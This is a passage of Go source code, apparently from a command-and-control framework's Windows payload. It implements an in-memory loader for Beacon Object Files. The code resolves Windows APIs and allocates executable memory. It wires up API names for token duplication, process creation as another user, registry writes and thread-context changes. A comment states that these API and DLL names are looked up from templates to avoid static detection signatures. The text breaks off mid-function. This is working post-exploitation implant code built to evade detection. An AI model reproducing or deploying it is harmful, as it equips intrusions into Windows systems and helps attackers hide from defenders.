// server/docker/payloads/Windows/coff_loader.go
//go:build windows
// +build windows

package main

import (
	_ "embed"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/RIscRIpt/pecoff"
	"github.com/RIscRIpt/pecoff/binutil"
	"github.com/RIscRIpt/pecoff/windef"
	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT             = windows.MEM_COMMIT
	MEM_RESERVE            = windows.MEM_RESERVE
	PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE
	PAGE_EXECUTE_READ      = windows.PAGE_EXECUTE_READ
	PAGE_READWRITE         = windows.PAGE_READWRITE
	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
)

// COFF loader strings - initialized from template lookup
// Uses coffTpl() for template lookup to avoid static signatures in binary
var (
	// Template storage - initialized by SetCOFFTemplate
	coffTemplate []string

	// DLL names
	coffDllKernel32 string
	coffDllNtdll    string
	coffDllUser32   string
	coffDllWs2_32   string
	coffDllAdvapi32 string

	// Prefixes/suffixes
	coffPrefixImp  string
	coffSuffixDll  string
	coffPrefixUs   string
	coffSectionBss string

	// Kernel32 API names
	coffApiFreeLibrary            string
	coffApiLoadLibraryA           string
	coffApiGetProcAddress         string
	coffApiGetModuleHandleA       string
	coffApiGetModuleFileNameA     string
	coffApiVirtualAlloc           string
	coffApiVirtualFree            string
	coffApiVirtualProtect         string
	coffApiSetLastError           string
	coffApiGetCurrentProcess      string
	coffApiGetProcessHeap         string
	coffApiHeapAlloc              string
	coffApiHeapFree               string
	coffApiWideCharToMultiByte    string
	coffApiGetCurrentThread       string
	coffApiGetThreadContext       string
	coffApiSetThreadContext       string
	coffApiSuspendThread          string
	coffApiResumeThread           string
	coffApiCreateThread           string
	coffApiExitThread             string
	coffApiGetSystemTime          string
	coffApiGetLocalTime           string
	coffApiGetFileAttributesA     string
	coffApiSetFileAttributesA     string
	coffApiCreateFileA            string
	coffApiReadFile               string
	coffApiWriteFile              string
	coffApiCloseHandle            string
	coffApiGetFileSize            string
	coffApiGetFileSizeEx          string
	coffApiFileTimeToSystemTime   string
	coffApiSystemTimeToTzSpecific string
	coffApiFindFirstFileA         string
	coffApiFindNextFileA          string
	coffApiFindClose              string
	coffApiGetLastError           string
	coffApiRtlCopyMemory          string

	// MSVCRT/String functions
	coffFnStrlen   string
	coffFnStrcmp   string
	coffFnStrncmp  string
	coffFnStricmp  string
	coffFnStrnicmp string
	coffFnStrcpy   string
	coffFnStrncpy  string
	coffFnStrcat   string
	coffFnStrncat  string
	coffFnStrstr   string

	// Memory functions
	coffFnCalloc  string
	coffFnMalloc  string
	coffFnFree    string
	coffFnRealloc string
	coffFnMemcpy  string
	coffFnMemset  string
	coffFnMemmove string
	coffFnMemcmp  string

	// Printf functions
	coffFnVsnprintf  string
	coffFnVsnprintfU string
	coffFnSprintf    string

	// User32 functions
	coffApiMessageBoxA      string
	coffApiMessageBoxW      string
	coffApiGetDesktopWindow string
	coffApiGetForegroundWnd string
	coffApiGetWindowTextA   string
	coffApiGetWindowTextW   string
	coffApiFindWindowA      string
	coffApiFindWindowW      string

	// WS2_32 functions
	coffApiWSAStartup    string
	coffApiWSACleanup    string
	coffApiWSAGetLastErr string
	coffApiSocket        string
	coffApiClosesocket   string
	coffApiBind          string
	coffApiListen        string
	coffApiAccept        string
	coffApiConnect       string
	coffApiSend          string
	coffApiRecv          string
	coffApiSendto        string
	coffApiRecvfrom      string
	coffApiSelect        string
	coffApiGethostbyname string
	coffApiGethostbyaddr string
	coffApiInet_addr     string
	coffApiInet_ntoa     string
	coffApiHtons         string
	coffApiHtonl         string
	coffApiNtohs         string
	coffApiNtohl         string

	// Advapi32 functions
	coffApiRegOpenKeyExA        string
	coffApiRegCloseKey          string
	coffApiRegQueryValueExA     string
	coffApiRegSetValueExA       string
	coffApiOpenProcessToken     string
	coffApiGetTokenInformation  string
	coffApiSetTokenInformation  string
	coffApiDuplicateTokenEx     string
	coffApiCreateProcessAsUserA string

	// Beacon API functions
	coffFnBeaconOutput       string
	coffFnBeaconDataParse    string
	coffFnBeaconDataInt      string
	coffFnBeaconDataShort    string
	coffFnBeaconDataLength   string
	coffFnBeaconDataExtract  string
	coffFnBeaconPrintf       string
	coffFnBeaconFormatAlloc  string
	coffFnBeaconFormatFree   string
	coffFnBeaconFormatAppend string
	coffFnBeaconFormatPrintf string
	coffFnBeaconFormatToStr  string
	coffFnBeaconFormatInt    string

	// Helper functions
	coffFnBofstart       string
	coffFnInternalPrintf string
	coffFnPrintoutput    string
	coffFnIntAlloc       string
	coffFnIntFree        string
	coffFnIntMemset      string
	coffFnIntMemcpy      string
	coffFnIntRealloc     string
	coffFnIntStrlen      string
	coffFnIntStrcmp      string
	coffFnIntStrncmp     string
	coffFnIntStrcpy      string
	coffFnIntStrncpy     string
	coffFnIntStrcat      string
	coffFnIntStrncat     string
	coffFnToWideChar     string
	coffFnUtf8ToUtf16    string
	coffFnUtf16ToUtf8    string
)

// Template indices for COFF loader strings (must match templates/common.go)
const (
	idxCoffDllKernel32 = 870
	idxCoffDllNtdll    = 871
	idxCoffDllUser32   = 872
	idxCoffDllWs2_32   = 873
	idxCoffDllAdvapi32 = 874

	idxCoffPrefixImp  = 875
	idxCoffSuffixDll  = 876
	idxCoffPrefixUs   = 877
	idxCoffSectionBss = 878

	idxCoffApiFreeLibrary            = 880
	idxCoffApiLoadLibraryA           = 881
	idxCoffApiGetProcAddress         = 882
	idxCoffApiGetModuleHandleA       = 883
	idxCoffApiGetModuleFileNameA     = 884
	idxCoffApiVirtualAlloc           = 885
	idxCoffApiVirtualFree            = 886
	idxCoffApiVirtualProtect         = 887
	idxCoffApiSetLastError           = 888
	idxCoffApiGetCurrentProcess      = 889
	idxCoffApiGetProcessHeap         = 890
	idxCoffApiHeapAlloc              = 891
	idxCoffApiHeapFree               = 892
	idxCoffApiWideCharToMultiByte    = 893
	idxCoffApiGetCurrentThread       = 894
	idxCoffApiGetThreadContext       = 895
	idxCoffApiSetThreadContext       = 896
	idxCoffApiSuspendThread          = 897
	idxCoffApiResumeThread           = 898
	idxCoffApiCreateThread           = 899
	idxCoffApiExitThread             = 900
	idxCoffApiGetSystemTime          = 901
	idxCoffApiGetLocalTime           = 902
	idxCoffApiGetFileAttributesA     = 903
	idxCoffApiSetFileAttributesA     = 904
	idxCoffApiCreateFileA            = 905
	idxCoffApiReadFile               = 906
	idxCoffApiWriteFile              = 907
	idxCoffApiCloseHandle            = 908
	idxCoffApiGetFileSize            = 909
	idxCoffApiGetFileSizeEx          = 910
	idxCoffApiFileTimeToSystemTime   = 911
	idxCoffApiSystemTimeToTzSpecific = 912
	idxCoffApiFindFirstFileA         = 913
	idxCoffApiFindNextFileA          = 914
	idxCoffApiFindClose              = 915
	idxCoffApiGetLastError           = 916
	idxCoffApiRtlCopyMemory          = 917

	idxCoffFnStrlen   = 918
	idxCoffFnStrcmp   = 919
	idxCoffFnStrncmp  = 920
	idxCoffFnStricmp  = 921
	idxCoffFnStrnicmp = 922
	idxCoffFnStrcpy   = 923
	idxCoffFnStrncpy  = 924
	idxCoffFnStrcat   = 925
	idxCoffFnStrncat  = 926
	idxCoffFnStrstr   = 927

	idxCoffFnCalloc  = 928
	idxCoffFnMalloc  = 929
	idxCoffFnFree    = 930
	idxCoffFnRealloc = 931
	idxCoffFnMemcpy  = 932
	idxCoffFnMemset  = 933
	idxCoffFnMemmove = 934
	idxCoffFnMemcmp  = 935

	idxCoffFnVsnprintf  = 936
	idxCoffFnVsnprintfU = 937
	idxCoffFnSprintf    = 938

	idxCoffApiMessageBoxA      = 939
	idxCoffApiMessageBoxW      = 940
	idxCoffApiGetDesktopWindow = 941
	idxCoffApiGetForegroundWnd = 942
	idxCoffApiGetWindowTextA   = 943
	idxCoffApiGetWindowTextW   = 944
	idxCoffApiFindWindowA      = 945
	idxCoffApiFindWindowW      = 946

	idxCoffApiWSAStartup    = 947
	idxCoffApiWSACleanup    = 948
	idxCoffApiWSAGetLastErr = 949
	idxCoffApiSocket        = 950
	idxCoffApiClosesocket   = 951
	idxCoffApiBind          = 952
	idxCoffApiListen        = 953
	idxCoffApiAccept        = 954
	idxCoffApiConnect       = 955
	idxCoffApiSend          = 956
	idxCoffApiRecv          = 957
	idxCoffApiSendto        = 958
	idxCoffApiRecvfrom      = 959
	idxCoffApiSelect        = 960
	idxCoffApiGethostbyname = 961
	idxCoffApiGethostbyaddr = 962
	idxCoffApiInet_addr     = 963
	idxCoffApiInet_ntoa     = 964
	idxCoffApiHtons         = 965
	idxCoffApiHtonl         = 966
	idxCoffApiNtohs         = 967
	idxCoffApiNtohl         = 968

	idxCoffApiRegOpenKeyExA        = 969
	idxCoffApiRegCloseKey          = 970
	idxCoffApiRegQueryValueExA     = 971
	idxCoffApiRegSetValueExA       = 972
	idxCoffApiOpenProcessToken     = 973
	idxCoffApiGetTokenInformation  = 974
	idxCoffApiSetTokenInformation  = 975
	idxCoffApiDuplicateTokenEx     = 976
	idxCoffApiCreateProcessAsUserA = 977

	idxCoffFnBeaconOutput       = 978
	idxCoffFnBeaconDataParse    = 979
	idxCoffFnBeaconDataInt      = 980
	idxCoffFnBeaconDataShort    = 981
	idxCoffFnBeaconDataLength   = 982
	idxCoffFnBeaconDataExtract  = 983
	idxCoffFnBeaconPrintf       = 984
	idxCoffFnBeaconFormatAlloc  = 985
	idxCoffFnBeaconFormatFree   = 986
	idxCoffFnBeaconFormatAppend = 987
	idxCoffFnBeaconFormatPrintf = 988
	idxCoffFnBeaconFormatToStr  = 989
	idxCoffFnBeaconFormatInt    = 990

	idxCoffFnBofstart       = 991
	idxCoffFnInternalPrintf = 992
	idxCoffFnPrintoutput    = 993
	idxCoffFnIntAlloc       = 994
	idxCoffFnIntFree        = 995
	idxCoffFnIntMemset      = 996
	idxCoffFnIntMemcpy      = 997
	idxCoffFnIntRealloc     = 998
	idxCoffFnIntStrlen      = 999
	idxCoffFnIntStrcmp      = 1000
	idxCoffFnIntStrncmp     = 1001
	idxCoffFnIntStrcpy      = 1002
	idxCoffFnIntStrncpy     = 1003
	idxCoffFnIntStrcat      = 1004
	idxCoffFnIntStrncat     = 1005
	idxCoffFnToWideChar     = 1006
	idxCoffFnUtf8ToUtf16    = 1007
	idxCoffFnUtf16ToUtf8    = 1008
)

// coffTpl returns template string at index, with empty string fallback
func coffTpl(idx int) string {
	if coffTemplate != nil && idx < len(coffTemplate) {
		return coffTemplate[idx]
	}
	return ""
}

// SetCOFFTemplate initializes COFF loader strings from a template
// This must be called before using any COFF loader functionality
func SetCOFFTemplate(tpl []string) {
	coffTemplate = tpl

	// DLL names
	coffDllKernel32 = coffTpl(idxCoffDllKernel32)
	coffDllNtdll = coffTpl(idxCoffDllNtdll)
	coffDllUser32 = coffTpl(idxCoffDllUser32)
	coffDllWs2_32 = coffTpl(idxCoffDllWs2_32)
	coffDllAdvapi32 = coffTpl(idxCoffDllAdvapi32)

	// Prefixes/suffixes
	coffPrefixImp = coffTpl(idxCoffPrefixImp)
	coffSuffixDll = coffTpl(idxCoffSuffixDll)
	coffPrefixUs = coffTpl(idxCoffPrefixUs)
	coffSectionBss = coffTpl(idxCoffSectionBss)

	// Kernel32 API names
	coffApiFreeLibrary = coffTpl(idxCoffApiFreeLibrary)
	coffApiLoadLibraryA = coffTpl(idxCoffApiLoadLibraryA)
	coffApiGetProcAddress = coffTpl(idxCoffApiGetProcAddress)
	coffApiGetModuleHandleA = coffTpl(idxCoffApiGetModuleHandleA)
	coffApiGetModuleFileNameA = coffTpl(idxCoffApiGetModuleFileNameA)
	coffApiVirtualAlloc = coffTpl(idxCoffApiVirtualAlloc)
	coffApiVirtualFree = coffTpl(idxCoffApiVirtualFree)
	coffApiVirtualProtect = coffTpl(idxCoffApiVirtualProtect)
	coffApiSetLastError = coffTpl(idxCoffApiSetLastError)
	coffApiGetCurrentProcess = coffTpl(idxCoffApiGetCurrentProcess)
	coffApiGetProcessHeap = coffTpl(idxCoffApiGetProcessHeap)
	coffApiHeapAlloc = coffTpl(idxCoffApiHeapAlloc)
	coffApiHeapFree = coffTpl(idxCoffApiHeapFree)
	coffApiWideCharToMultiByte = coffTpl(idxCoffApiWideCharToMultiByte)
	coffApiGetCurrentThread = coffTpl(idxCoffApiGetCurrentThread)
	coffApiGetThreadContext = coffTpl(idxCoffApiGetThreadContext)
	coffApiSetThreadContext = coffTpl(idxCoffApiSetThreadContext)
	coffApiSuspendThread = coffTpl(idxCoffApiSuspendThread)
	coffApiResumeThread = coffTpl(idxCoffApiResumeThread)
	coffApiCreateThread = coffTpl(idxCoffApiCreateThread)
	coffApiExitThread = coffTpl(idxCoffApiExitThread)
	coffApiGetSystemTime = coffTpl(idxCoffApiGetSystemTime)
	coffApiGetLocalTime = coffTpl(idxCoffApiGetLocalTime)
	coffApiGetFileAttributesA = coffTpl(idxCoffApiGetFileAttributesA)
	coffApiSetFileAttributesA = coffTpl(idxCoffApiSetFileAttributesA)
	coffApiCreateFileA = coffTpl(idxCoffApiCreateFileA)
	coffApiReadFile = coffTpl(idxCoffApiReadFile)
	coffApiWriteFile = coffTpl(idxCoffApiWriteFile)
	coffApiCloseHandle = coffTpl(idxCoffApiCloseHandle)
	coffApiGetFileSize = coffTpl(idxCoffApiGetFileSize)
	coffApiGetFileSizeEx = coffTpl(idxCoffApiGetFileSizeEx)
	coffApiFileTimeToSystemTime = coffTpl(idxCoffApiFileTimeToSystemTime)
	coffApiSystemTimeToTzSpecific = coffTpl(idxCoffApiSystemTimeToTzSpecific)
	coffApiFindFirstFileA = coffTpl(idxCoffApiFindFirstFileA)
	coffApiFindNextFileA = coffTpl(idxCoffApiFindNextFileA)
	coffApiFindClose = coffTpl(idxCoffApiFindClose)
	coffApiGetLastError = coffTpl(idxCoffApiGetLastError)
	coffApiRtlCopyMemory = coffTpl(idxCoffApiRtlCopyMemory)

	// MSVCRT/String functions
	coffFnStrlen = coffTpl(idxCoffFnStrlen)
	coffFnStrcmp = coffTpl(idxCoffFnStrcmp)
	coffFnStrncmp = coffTpl(idxCoffFnStrncmp)
	coffFnStricmp = coffTpl(idxCoffFnStricmp)
	coffFnStrnicmp = coffTpl(idxCoffFnStrnicmp)
	coffFnStrcpy = coffTpl(idxCoffFnStrcpy)
	coffFnStrncpy = coffTpl(idxCoffFnStrncpy)
	coffFnStrcat = coffTpl(idxCoffFnStrcat)
	coffFnStrncat = coffTpl(idxCoffFnStrncat)
	coffFnStrstr = coffTpl(idxCoffFnStrstr)

	// Memory functions
	coffFnCalloc = coffTpl(idxCoffFnCalloc)
	coffFnMalloc = coffTpl(idxCoffFnMalloc)
	coffFnFree = coffTpl(idxCoffFnFree)
	coffFnRealloc = coffTpl(idxCoffFnRealloc)
	coffFnMemcpy = coffTpl(idxCoffFnMemcpy)
	coffFnMemset = coffTpl(idxCoffFnMemset)
	coffFnMemmove = coffTpl(idxCoffFnMemmove)
	coffFnMemcmp = coffTpl(idxCoffFnMemcmp)

	// Printf functions
	coffFnVsnprintf = coffTpl(idxCoffFnVsnprintf)
	coffFnVsnprintfU = coffTpl(idxCoffFnVsnprintfU)
	coffFnSprintf = coffTpl(idxCoffFnSprintf)

	// User32 functions
	coffApiMessageBoxA = coffTpl(idxCoffApiMessageBoxA)
	coffApiMessageBoxW = coffTpl(idxCoffApiMessageBoxW)
	coffApiGetDesktopWindow = coffTpl(idxCoffApiGetDesktopWindow)
	coffApiGetForegroundWnd = coffTpl(idxCoffApiGetForegroundWnd)
	coffApiGetWindowTextA = coffTpl(idxCoffApiGetWindowTextA)
	coffApiGetWindowTextW = coffTpl(idxCoffApiGetWindowTextW)
	coffApiFindWindowA = coffTpl(idxCoffApiFindWindowA)
	coffApiFindWindowW = coffTpl(idxCoffApiFindWindowW)

	// WS2_32 functions
	coffApiWSAStartup = coffTpl(idxCoffApiWSAStartup)
	coffApiWSACleanup = coffTpl(idxCoffApiWSACleanup)
	coffApiWSAGetLastErr = coffTpl(idxCoffApiWSAGetLastErr)
	coffApiSocket = coffTpl(idxCoffApiSocket)
	coffApiClosesocket = coffTpl(idxCoffApiClosesocket)
	coffApiBind = coffTpl(idxCoffApiBind)
	coffApiListen = coffTpl(idxCoffApiListen)
	coffApiAccept = coffTpl(idxCoffApiAccept)
	coffApiConnect = coffTpl(idxCoffApiConnect)
	coffApiSend = coffTpl(idxCoffApiSend)
	coffApiRecv = coffTpl(idxCoffApiRecv)
	coffApiSendto = coffTpl(idxCoffApiSendto)
	coffApiRecvfrom = coffTpl(idxCoffApiRecvfrom)
	coffApiSelect = coffTpl(idxCoffApiSelect)
	coffApiGethostbyname = coffTpl(idxCoffApiGethostbyname)
	coffApiGethostbyaddr = coffTpl(idxCoffApiGethostbyaddr)
	coffApiInet_addr = coffTpl(idxCoffApiInet_addr)
	coffApiInet_ntoa = coffTpl(idxCoffApiInet_ntoa)
	coffApiHtons = coffTpl(idxCoffApiHtons)
	coffApiHtonl = coffTpl(idxCoffApiHtonl)
	coffApiNtohs = coffTpl(idxCoffApiNtohs)
	coffApiNtohl = coffTpl(idxCoffApiNtohl)

	// Advapi32 functions
	coffApiRegOpenKeyExA = coffTpl(idxCoffApiRegOpenKeyExA)
	coffApiRegCloseKey = coffTpl(idxCoffApiRegCloseKey)
	coffApiRegQueryValueExA = coffTpl(idxCoffApiRegQueryValueExA)
	coffApiRegSetValueExA = coffTpl(idxCoffApiRegSetValueExA)
	coffApiOpenProcessToken = coffTpl(idxCoffApiOpenProcessToken)
	coffApiGetTokenInformation = coffTpl(idxCoffApiGetTokenInformation)
	coffApiSetTokenInformation = coffTpl(idxCoffApiSetTokenInformation)
	coffApiDuplicateTokenEx = coffTpl(idxCoffApiDuplicateTokenEx)
	coffApiCreateProcessAsUserA = coffTpl(idxCoffApiCreateProcessAsUserA)

	// Beacon API functions
	coffFnBeaconOutput = coffTpl(idxCoffFnBeaconOutput)
	coffFnBeaconDataParse = coffTpl(idxCoffFnBeaconDataParse)
	coffFnBeaconDataInt = coffTpl(idxCoffFnBeaconDataInt)
	coffFnBeaconDataShort = coffTpl(idxCoffFnBeaconDataShort)
	coffFnBeaconDataLength = coffTpl(idxCoffFnBeaconDataLength)
	coffFnBeaconDataExtract = coffTpl(idxCoffFnBeaconDataExtract)
	coffFnBeaconPrintf = coffTpl(idxCoffFnBeaconPrintf)
	coffFnBeaconFormatAlloc = coffTpl(idxCoffFnBeaconFormatAlloc)
	coffFnBeaconFormatFree = coffTpl(idxCoffFnBeaconFormatFree)
	coffFnBeaconFormatAppend = coffTpl(idxCoffFnBeaconFormatAppend)
	coffFnBeaconFormatPrintf = coffTpl(idxCoffFnBeaconFormatPrintf)
	coffFnBeaconFormatToStr = coffTpl(idxCoffFnBeaconFormatToStr)
	coffFnBeaconFormatInt = coffTpl(idxCoffFnBeaconFormatInt)

	// Helper functions
	coffFnBofstart = coffTpl(idxCoffFnBofstart)
	coffFnInternalPrintf = coffTpl(idxCoffFnInternalPrintf)
	coffFnPrintoutput = coffTpl(idxCoffFnPrintoutput)
	coffFnIntAlloc = coffTpl(idxCoffFnIntAlloc)
	coffFnIntFree = coffTpl(idxCoffFnIntFree)
	coffFnIntMemset = coffTpl(idxCoffFnIntMemset)
	coffFnIntMemcpy = coffTpl(idxCoffFnIntMemcpy)
	coffFnIntRealloc = coffTpl(idxCoffFnIntRealloc)
	coffFnIntStrlen = coffTpl(idxCoffFnIntStrlen)
	coffFnIntStrcmp = coffTpl(idxCoffFnIntStrcmp)
	coffFnIntStrncmp = coffTpl(idxCoffFnIntStrncmp)
	coffFnIntStrcpy = coffTpl(idxCoffFnIntStrcpy)
	coffFnIntStrncpy = coffTpl(idxCoffFnIntStrncpy)
	coffFnIntStrcat = coffTpl(idxCoffFnIntStrcat)
	coffFnIntStrncat = coffTpl(idxCoffFnIntStrncat)
	coffFnToWideChar = coffTpl(idxCoffFnToWideChar)
	coffFnUtf8ToUtf16 = coffTpl(idxCoffFnUtf8ToUtf16)
	coffFnUtf16ToUtf8 = coffTpl(idxCoffFnUtf16ToUtf8)
}

var (
	// DLL handles and proc addresses - initialized lazily by initCOFFDLLs
	coffKernel32       *syscall.DLL
	coffNtdll          *syscall.DLL
	procVirtualAlloc   *syscall.Proc
	procVirtualProtect *syscall.Proc
	procVirtualFree    *syscall.Proc
	procRtlCopyMemory  *syscall.Proc
	coffDLLsInitialized bool
	coffDLLsInitMutex   sync.Mutex

	// Global map to keep allocated memory alive during BOF execution
	bofAllocations = make(map[uintptr][]byte)
	bofAllocMutex  sync.Mutex
)

// initCOFFDLLs lazily initializes DLL handles and proc addresses
// Must be called after SetCOFFTemplate
func initCOFFDLLs() error {
	coffDLLsInitMutex.Lock()
	defer coffDLLsInitMutex.Unlock()

	if coffDLLsInitialized {
		return nil
	}

	var err error
	coffKernel32, err = syscall.LoadDLL(coffDllKernel32)
	if err != nil {
		return fmt.Errorf("failed to load %s: %w", coffDllKernel32, err)
	}

	coffNtdll, err = syscall.LoadDLL(coffDllNtdll)
	if err != nil {
		return fmt.Errorf("failed to load %s: %w", coffDllNtdll, err)
	}

	procVirtualAlloc, err = coffKernel32.FindProc(coffApiVirtualAlloc)
	if err != nil {
		return fmt.Errorf("failed to find %s: %w", coffApiVirtualAlloc, err)
	}

	procVirtualProtect, err = coffKernel32.FindProc(coffApiVirtualProtect)
	if err != nil {
		return fmt.Errorf("failed to find %s: %w", coffApiVirtualProtect, err)
	}

	procVirtualFree, err = coffKernel32.FindProc(coffApiVirtualFree)
	if err != nil {
		return fmt.Errorf("failed to find %s: %w", coffApiVirtualFree, err)
	}

	procRtlCopyMemory, err = coffNtdll.FindProc(coffApiRtlCopyMemory)
	if err != nil {
		return fmt.Errorf("failed to find %s: %w", coffApiRtlCopyMemory, err)
	}

	coffDLLsInitialized = true
	return nil
}

// Global output buffer for BOFs
var bofOutputBuffer []byte
var bofOutputMutex sync.Mutex

// Memory management for BOFs
var allocatedMemory = make(map[uintptr][]byte)
var allocMutex sync.Mutex

type CoffSection struct {
	Section *pecoff.Section
	Address uintptr
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) uintptr {
	if !strings.HasPrefix(symbolName, coffPrefixImp) {
		return 0
	}

	symbolName = symbolName[6:] // Remove __imp_

	// Handle 32-bit naming convention
	if strings.HasPrefix(symbolName, coffPrefixUs) {
		symbolName = symbolName[1:]
	}

	libName := ""
	procName := ""

	// Check for Dynamic Function Resolution naming ($)
	parts := strings.Split(symbolName, "$")
	if len(parts) == 2 {
		libName = parts[0] + coffSuffixDll
		procName = parts[1]
	} else {
		procName = symbolName

		// Map known functions to their libraries
		switch procName {
		// Kernel32 functions
		case coffApiFreeLibrary, coffApiLoadLibraryA, coffApiGetProcAddress, coffApiGetModuleHandleA,
			coffApiGetModuleFileNameA, coffApiVirtualAlloc, coffApiVirtualFree, coffApiVirtualProtect,
			coffApiSetLastError, coffApiGetCurrentProcess, coffApiGetProcessHeap, coffApiHeapAlloc, coffApiHeapFree,
			coffApiWideCharToMultiByte, coffApiGetCurrentThread, coffApiGetThreadContext,
			coffApiSetThreadContext, coffApiSuspendThread, coffApiResumeThread, coffApiCreateThread,
			coffApiExitThread, coffApiGetSystemTime, coffApiGetLocalTime, coffApiGetFileAttributesA,
			coffApiSetFileAttributesA, coffApiCreateFileA, coffApiReadFile, coffApiWriteFile,
			coffApiCloseHandle, coffApiGetFileSize, coffApiGetFileSizeEx, coffApiFileTimeToSystemTime,
			coffApiSystemTimeToTzSpecific:
			libName = coffDllKernel32

		case coffApiFindFirstFileA:
			hModule, err := syscall.LoadLibrary(coffDllKernel32)
			if err != nil {
				return 0
			}

			addr, err := syscall.GetProcAddress(hModule, coffApiFindFirstFileA)
			if err != nil {
				return 0
			}

			// Wrap the function to add debugging
			return windows.NewCallback(func(lpFileName, lpFindFileData uintptr) uintptr {
				_ = ReadCStringFromPtr(lpFileName)

				// Call the real FindFirstFileA
				ret, _, _ := syscall.SyscallN(addr, lpFileName, lpFindFileData)

				if ret == 0xFFFFFFFFFFFFFFFF { // INVALID_HANDLE_VALUE
					// Get last error
					_ = syscall.GetLastError()
				} else {
				}

				return ret
			})

		case coffApiFindNextFileA:
			hModule, err := syscall.LoadLibrary(coffDllKernel32)
			if err != nil {
				return 0
			}

			addr, err := syscall.GetProcAddress(hModule, coffApiFindNextFileA)
			if err != nil {
				return 0
			}

			return windows.NewCallback(func(hFindFile, lpFindFileData uintptr) uintptr {
				ret, _, _ := syscall.SyscallN(addr, hFindFile, lpFindFileData)
				if ret == 0 {
					_ = syscall.GetLastError()
				}
				return ret
			})

		case coffApiFindClose:
			hModule, err := syscall.LoadLibrary(coffDllKernel32)
			if err != nil {
				return 0
			}

			addr, err := syscall.GetProcAddress(hModule, coffApiFindClose)
			if err != nil {
				return 0
			}

			return windows.NewCallback(func(hFindFile uintptr) uintptr {
				ret, _, _ := syscall.SyscallN(addr, hFindFile)
				return ret
			})

		case coffApiGetLastError:
			k32 := syscall.MustLoadDLL(coffDllKernel32)
			procGetLastError := k32.MustFindProc(coffApiGetLastError)

			return windows.NewCallback(func() uintptr {
				ret, _, _ := procGetLastError.Call()
				return ret
			})

		// MSVCRT functions - Custom implementations
		case coffFnStrlen:
			return windows.NewCallback(func(str uintptr) uintptr {
				if str == 0 {
					return 0
				}
				length := 0
				for {
					if *(*byte)(unsafe.Pointer(str + uintptr(length))) == 0 {
						break
					}
					length++
					if length > 65536 { // Safety check
						break
					}
				}
				return uintptr(length)
			})

		case coffFnStrcmp:
			return windows.NewCallback(func(str1, str2 uintptr) uintptr {
				if str1 == 0 && str2 == 0 {
					return 0
				}
				if str1 == 0 {
					return uintptr(uint64(0xFFFFFFFFFFFFFFFF)) // -1
				}
				if str2 == 0 {
					return 1
				}

				i := 0
				for {
					c1 := *(*byte)(unsafe.Pointer(str1 + uintptr(i)))
					c2 := *(*byte)(unsafe.Pointer(str2 + uintptr(i)))

					if c1 != c2 {
						if c1 < c2 {
							return uintptr(uint64(0xFFFFFFFFFFFFFFFF)) // -1
						}
						return 1
					}
					if c1 == 0 {
						return 0
					}
					i++
					if i > 65536 { // Safety check
						break
					}
				}
				return 0
			})

		case coffFnStrncmp:
			return windows.NewCallback(func(str1, str2, n uintptr) uintptr {
				if n == 0 {
					return 0
				}
				if str1 == 0 && str2 == 0 {
					return 0
				}
				if str1 == 0 {
					return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
				}
				if str2 == 0 {
					return 1
				}

				for i := uintptr(0); i < n; i++ {
					c1 := *(*byte)(unsafe.Pointer(str1 + i))
					c2 := *(*byte)(unsafe.Pointer(str2 + i))

					if c1 != c2 {
						if c1 < c2 {
							return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
						}
						return 1
					}
					if c1 == 0 {
						return 0
					}
				}
				return 0
			})

		case coffFnStricmp:
			return windows.NewCallback(func(str1, str2 uintptr) uintptr {
				if str1 == 0 && str2 == 0 {
					return 0
				}
				if str1 == 0 {
					return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
				}
				if str2 == 0 {
					return 1
				}

				i := 0
				for {
					c1 := *(*byte)(unsafe.Pointer(str1 + uintptr(i)))
					c2 := *(*byte)(unsafe.Pointer(str2 + uintptr(i)))

					// Convert to lowercase for comparison
					if c1 >= 'A' && c1 <= 'Z' {
						c1 = c1 + 32
					}
					if c2 >= 'A' && c2 <= 'Z' {
						c2 = c2 + 32
					}

					if c1 != c2 {
						if c1 < c2 {
							return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
						}
						return 1
					}
					if c1 == 0 {
						return 0
					}
					i++
					if i > 65536 {
						break
					}
				}
				return 0
			})

		case coffFnStrnicmp:
			return windows.NewCallback(func(str1, str2, n uintptr) uintptr {
				if n == 0 {
					return 0
				}
				if str1 == 0 && str2 == 0 {
					return 0
				}
				if str1 == 0 {
					return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
				}
				if str2 == 0 {
					return 1
				}

				for i := uintptr(0); i < n; i++ {
					c1 := *(*byte)(unsafe.Pointer(str1 + i))
					c2 := *(*byte)(unsafe.Pointer(str2 + i))

					// Convert to lowercase for comparison
					if c1 >= 'A' && c1 <= 'Z' {
						c1 = c1 + 32
					}
					if c2 >= 'A' && c2 <= 'Z' {
						c2 = c2 + 32
					}

					if c1 != c2 {
						if c1 < c2 {
							return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
						}
						return 1
					}
					if c1 == 0 {
						return 0
					}
				}
				return 0
			})

		case coffFnStrcpy:
			return windows.NewCallback(func(dst, src uintptr) uintptr {
				if dst == 0 || src == 0 {
					return dst
				}
				i := 0
				for {
					b := *(*byte)(unsafe.Pointer(src + uintptr(i)))
					*(*byte)(unsafe.Pointer(dst + uintptr(i))) = b
					if b == 0 {
						break
					}
					i++
					if i > 65536 { // Safety check
						break
					}
				}
				return dst
			})

		case coffFnStrncpy:
			return windows.NewCallback(func(dst, src, n uintptr) uintptr {
				if dst == 0 || src == 0 || n == 0 {
					return dst
				}

				i := uintptr(0)
				for i < n {
					b := *(*byte)(unsafe.Pointer(src + i))
					*(*byte)(unsafe.Pointer(dst + i)) = b
					i++
					if b == 0 {
						// Pad with zeros
						for i < n {
							*(*byte)(unsafe.Pointer(dst + i)) = 0
							i++
						}
						break
					}
				}
				return dst
			})

		case coffFnStrcat:
			return windows.NewCallback(func(dst, src uintptr) uintptr {
				if dst == 0 || src == 0 {
					return dst
				}

				// Find end of dst
				dstLen := 0
				for {
					if *(*byte)(unsafe.Pointer(dst + uintptr(dstLen))) == 0 {
						break
					}
					dstLen++
					if dstLen > 65536 {
						return dst
					}
				}

				// Copy src to end of dst
